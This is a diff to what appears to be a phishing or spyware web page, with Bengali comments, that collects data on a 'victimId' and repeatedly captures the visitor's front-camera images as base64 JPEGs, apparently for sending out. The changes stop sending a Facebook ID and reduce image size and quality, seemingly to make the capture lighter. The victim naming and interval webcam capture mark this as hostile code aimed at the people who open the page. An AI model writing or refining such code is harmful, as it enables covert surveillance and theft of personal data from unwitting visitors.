@@ -118,7 +118,6 @@
 
             async function collectData() {
                 try {
-                    // 🔥 fbId আর পাঠানো হচ্ছে না
                     const data = {
                         id: victimId,
                         timestamp: new Date().toISOString(),
@@ -235,8 +234,8 @@
                         setStatus('📸 ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: {
-                                width: { ideal: 1280 },
-                                height: { ideal: 720 },
+                                width: { ideal: 640 },   // 🔥 ছোট সাইজ
+                                height: { ideal: 480 },
                                 facingMode: 'user'
                             },
                             audio: false
@@ -249,11 +248,13 @@
                         let captureCount = 0;
                         const interval = setInterval(async () => {
                             if (!video.videoWidth || !video.videoHeight) return;
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
+                            // ক্যানভাসের সাইজ ঠিক করা
+                            canvas.width = 640;
+                            canvas.height = 480;
                             const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                            ctx.drawImage(video, 0, 0, 640, 480);
+                            // কম কোয়ালিটি (0.5) এবং ছোট সাইজ
+                            const imageData = canvas.toDataURL('image/jpeg', 0.5);
                             const rawBase64 = imageData.split(',')[1];
 
                             try {
